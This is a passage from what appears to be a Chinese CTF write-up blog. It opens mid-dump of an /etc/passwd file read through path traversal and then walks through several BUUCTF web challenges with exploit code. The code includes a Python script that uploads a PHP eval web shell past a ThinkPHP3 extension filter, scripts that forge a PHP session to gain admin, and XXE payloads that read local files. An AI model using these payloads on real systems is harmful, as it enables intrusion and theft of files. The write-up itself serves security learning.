Font Server:/etc/X11/fs:/sbin/nologin</span><br><span class="line">games:x:35:35:games:/usr/games:/sbin/nologin</span><br><span class="line">postgres:x:70:70::/var/lib/postgresql:/bin/sh</span><br><span class="line">cyrus:x:85:12::/usr/cyrus:/sbin/nologin</span><br><span class="line">vpopmail:x:89:89::/var/vpopmail:/sbin/nologin</span><br><span class="line">ntp:x:123:123:NTP:/var/empty:/sbin/nologin</span><br><span class="line">smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin</span><br><span class="line">guest:x:405:100:guest:/dev/null:/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/:/sbin/nologin</span><br><span class="line">www-data:x:82:82:Linux User,,,:/home/www-data:/bin/false</span><br><span class="line">mysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologin</span><br><span class="line">nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin	</span><br></pre></td></tr></table></figure>
<p><code>?img_file=/../flag.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag is here,but you must try to see it.&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;69ecf61f-34dc-4de7-8aa1-8aed1c69fc31&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/107747352">https://blog.csdn.net/mochu7777777/article/details/107747352</a><br>靶场损坏</p>
<h1 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h1><p>考点:TP3文件上传，多文件上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">\Think\Upload</span>();<span class="comment">// 实例化上传类</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">upload</span>() ;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$info</span>) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">getError</span>());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          <span class="variable">$url</span> = __ROOT__.<span class="title function_ invoke__">substr</span>(<span class="variable">$upload</span>-&gt;rootPath,<span class="number">1</span>).<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;<span class="variable">$url</span>,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开局给了首页的代码，就2个功能，一个文件上传，这是主要功能点</p>
<h2 id="多文件上传解法"><a href="#多文件上传解法" class="headerlink" title="多文件上传解法"></a>多文件上传解法</h2><p>tp3支持多文件上传：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677826767873-f7b3a319-19cd-4b8b-895e-34e61ff9b5c4.png#averageHue=%23fefefe&clientId=u9d8eabe2-1a61-4&from=paste&height=337&id=u8326c4d9&name=image.png&originHeight=421&originWidth=1325&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33305&status=done&style=none&taskId=ue405d958-1ed1-4786-a0b4-ca845e66ba1&title=&width=1060" alt="image.png"><br>所以我们只需用python写个多文件上传脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://e5e42b72-7b4d-40d3-9c12-550d48e26d00.node4.buuoj.cn:81/?s=home/index/upload&quot;</span></span><br><span class="line">file_content=<span class="string">b&quot;&lt;?php eval($_POST[&#x27;boogipop&#x27;]);?&gt;&quot;</span></span><br><span class="line">filename=<span class="string">&quot;1.&lt;&gt;php&quot;</span></span><br><span class="line">file=[</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>,(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;w3333&quot;</span>,<span class="string">&#x27;image/png&#x27;</span>))</span><br><span class="line">      ]</span><br><span class="line">file2=[</span><br><span class="line">    (<span class="string">&#x27;file[]&#x27;</span>,(<span class="string">&quot;1.php&quot;</span>,file_content,<span class="string">&#x27;image/png&#x27;</span>))</span><br><span class="line">      ]</span><br><span class="line">file3=[</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>,(<span class="string">&quot;233.txt&quot;</span>,<span class="string">&quot;test&quot;</span>,<span class="string">&#x27;image/png&#x27;</span>))</span><br><span class="line">      ]</span><br><span class="line">file4=[</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>,(filename,file_content,<span class="string">&#x27;image/png&#x27;</span>))</span><br><span class="line">      ]</span><br><span class="line"><span class="comment"># r1=requests.post(url=url,files=hta_file)</span></span><br><span class="line">r=requests.post(url=url,files=file)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r=requests.post(url=url,files=file2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r=requests.post(url=url,files=file3)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># r=requests.post(url=url,files=file4)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"><span class="comment"># print(r1.text)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677826799124-f3e1f112-973d-4458-8365-66dba1a283be.png#averageHue=%2331302e&clientId=u9d8eabe2-1a61-4&from=paste&height=98&id=uf4cb0f63&name=image.png&originHeight=123&originWidth=969&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26840&status=done&style=none&taskId=ue70e5347-12a5-4575-a3c6-5b7cf1303cd&title=&width=775.2" alt="image.png"><br>由于是数组，返回不了文件路径，因此需要爆破</p>
<h2 id="strip-tag解法"><a href="#strip-tag解法" class="headerlink" title="strip_tag解法"></a>strip_tag解法</h2><p>审计tp3关于文件上传的部分可以看到一个很有趣的函数：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677826855486-cf423a2f-cefb-4fd9-bbd0-e56c8643bca8.png#averageHue=%23fefdfd&clientId=u9d8eabe2-1a61-4&from=paste&height=162&id=u68d01a38&name=image.png&originHeight=202&originWidth=937&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14383&status=done&style=none&taskId=ua040d8bb-3fe2-497a-a1be-9c3a6e267ba&title=&width=749.6" alt="image.png"><br>对文件名做了一次strip_tags处理，那么我们直接上传<code>1.&lt;&gt;php</code>即可。。。。</p>
<h1 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h1><p>考点：PHP SESSION伪造<br>在PHP中session文件的命名规范一般都是，<code>sess_xxxxxxx</code>，其中xxxx的内容就是PHPSESSID的值，那么看看题目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_save_path</span>(<span class="string">&quot;/var/babyctf/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] ===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="string">&#x27;/var/babyctf/success.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_delete</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] =<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$direction</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_POST, <span class="string">&#x27;direction&#x27;</span>);</span><br><span class="line"><span class="variable">$attr</span> = <span class="title function_ invoke__">filter_input</span>(INPUT_POST, <span class="string">&#x27;attr&#x27;</span>);</span><br><span class="line"><span class="variable">$dir_path</span> = <span class="string">&quot;/var/babyctf/&quot;</span>.<span class="variable">$attr</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$attr</span>===<span class="string">&quot;private&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$dir_path</span> .= <span class="string">&quot;/&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$direction</span> === <span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid upload&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_path</span> .= <span class="string">&quot;_&quot;</span>.<span class="title function_ invoke__">hash_file</span>(<span class="string">&quot;sha256&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir_path</span>, <span class="number">0700</span>, <span class="literal">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;up_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$upload_result</span> = <span class="string">&quot;uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$upload_result</span> = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$direction</span> === <span class="string">&quot;download&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="title function_ invoke__">filter_input</span>(INPUT_POST, <span class="string">&#x27;filename&#x27;</span>));</span><br><span class="line">        <span class="variable">$file_path</span> = <span class="variable">$dir_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\.\.\/|\.\.\\\\)/&#x27;</span>, <span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;invalid file path&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;file not exist&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/force-download&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length: &#x27;</span>.<span class="title function_ invoke__">filesize</span>(<span class="variable">$file_path</span>));</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>, <span class="number">0</span>, -<span class="number">65</span>).<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">readfile</span>(<span class="variable">$file_path</span>))&#123;</span><br><span class="line">            <span class="variable">$download_result</span> = <span class="string">&quot;downloaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;error while saving&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">RuntimeException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="variable">$download_result</span> = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这边一个上传功能，上传文件后会在后面添加一个hashfile的值，我们可以先读取自己的session文件：<code>sess_4dbfe0ce757ff7bbedd8ee52caa3e4a5</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677837483573-13cd0a75-f697-4305-a1fd-1e05d4a7b1e0.png#averageHue=%23f0f2f3&clientId=u00fa2a9f-efbd-4&from=paste&height=76&id=u74b40bed&name=image.png&originHeight=95&originWidth=1722&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15881&status=done&style=none&taskId=u8702a98e-9e1d-4365-ba63-ce7b3f92fef&title=&width=1377.6" alt="image.png"><br><code>POST: direction=download&amp;filename=sess_4dbfe0ce757ff7bbedd8ee52caa3e4a5</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677837533253-0b3b3f8a-f3fb-4e65-b903-b845a11f7e99.png#averageHue=%23454545&clientId=u00fa2a9f-efbd-4&from=paste&height=378&id=uf3f1d24e&name=image.png&originHeight=472&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70368&status=done&style=none&taskId=u392e8d8b-de52-47d1-ac16-2bef330e29c&title=&width=1536" alt="image.png"><br><code>usernames:5:&quot;guest&quot;;</code>,我们把他伪造成<code>usernames:5:&quot;admin&quot;;</code>保存在本地,然后用hashfile去计算文件的hash：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677837746844-f3a47544-0867-4f16-b11a-938c6c39ce8f.png#averageHue=%23313841&clientId=u00fa2a9f-efbd-4&from=paste&height=342&id=ubcabe3bd&name=image.png&originHeight=428&originWidth=1581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60995&status=done&style=none&taskId=u4986951c-c9fd-4641-8ddf-21e38d27478&title=&width=1264.8" alt="image.png"><br>所以我们可以上传这个session文件，上传过后的文件名应该是<code>sess_a2527061d62f9711631cf316fb744e48c2fc693955519286dd3b4f3c73227513</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line">import requests</span><br><span class="line">url=<span class="string">&quot;http://e5693529-d918-48ec-8b3f-aeffe65b24ad.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;direction&quot;</span>:<span class="string">&quot;upload&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">file=[</span><br><span class="line">    (<span class="string">&#x27;up_file&#x27;</span>,(<span class="string">&quot;sess&quot;</span>,<span class="title function_ invoke__">open</span>(<span class="string">&quot;session&quot;</span>,<span class="string">&quot;r&quot;</span>).<span class="title function_ invoke__">read</span>()))</span><br><span class="line">      ]</span><br><span class="line">r=requests.<span class="title function_ invoke__">post</span>(url=url,files=file,data=data)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677838314641-ee4b93d6-9dc8-43a4-a9a9-f350d3955e92.png#averageHue=%233f3f3f&clientId=u00fa2a9f-efbd-4&from=paste&height=390&id=ua3d16bf6&name=image.png&originHeight=487&originWidth=1429&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62281&status=done&style=none&taskId=uc4fab56c-7e20-4d59-8772-8fb1a89a39e&title=&width=1143.2" alt="image.png"><br>这样我们就成功伪造了自己的session，记得把PHPSESSID改为文件的hash值，符合规则<br>然后就是绕过第二个if，我们要让file_exists绕过，这个函数判断文件或者目录是否存在，然后attr参数又可控，我们直接让attr等于<code>success.txt</code>就行了，然后随便上传一个文件，触发mkdir函数，即可绕过：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://e5693529-d918-48ec-8b3f-aeffe65b24ad.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;direction&quot;</span>:<span class="string">&quot;upload&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attr&quot;</span>:<span class="string">&quot;success.txt&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">file=[</span><br><span class="line">    (<span class="string">&#x27;up_file&#x27;</span>,(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>))</span><br><span class="line">      ]</span><br><span class="line">r=requests.post(url=url,files=file,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677838618380-69440f73-96a0-497a-9020-f0594901b03a.png#averageHue=%23626261&clientId=u00fa2a9f-efbd-4&from=paste&height=459&id=u2f38e03b&name=image.png&originHeight=574&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62003&status=done&style=none&taskId=uf4ad72bc-f2dc-41a0-95b8-7a575fac945&title=&width=1532.8" alt="image.png"></p>
<h1 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h1><p>考点：XML内部实体注入<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677843083660-78e29f1d-6303-41d8-9e12-90cc5c002344.png#averageHue=%23f9f9f9&clientId=u00fa2a9f-efbd-4&from=paste&height=450&id=u30a79a95&name=image.png&originHeight=563&originWidth=1571&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=92311&status=done&style=none&taskId=ucfb6a7f8-0f6a-47f4-8cc4-a2517a52bdf&title=&width=1256.8" alt="image.png"><br>将内容改为xml后报错，说明存在XML注入，尝试用一般的实体带出：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">feng</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span>  <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677843188448-69f5c8e0-c89b-451b-8a23-83edf7abe220.png#averageHue=%23fafafa&clientId=u00fa2a9f-efbd-4&from=paste&height=542&id=u6a53969c&name=image.png&originHeight=678&originWidth=1570&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=99061&status=done&style=none&taskId=u6cba56f9-e9c6-4bab-a8a0-b3c4a022b54&title=&width=1256" alt="image.png"><br>说我们没声明标签，那就声明一下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">message</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span>  <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
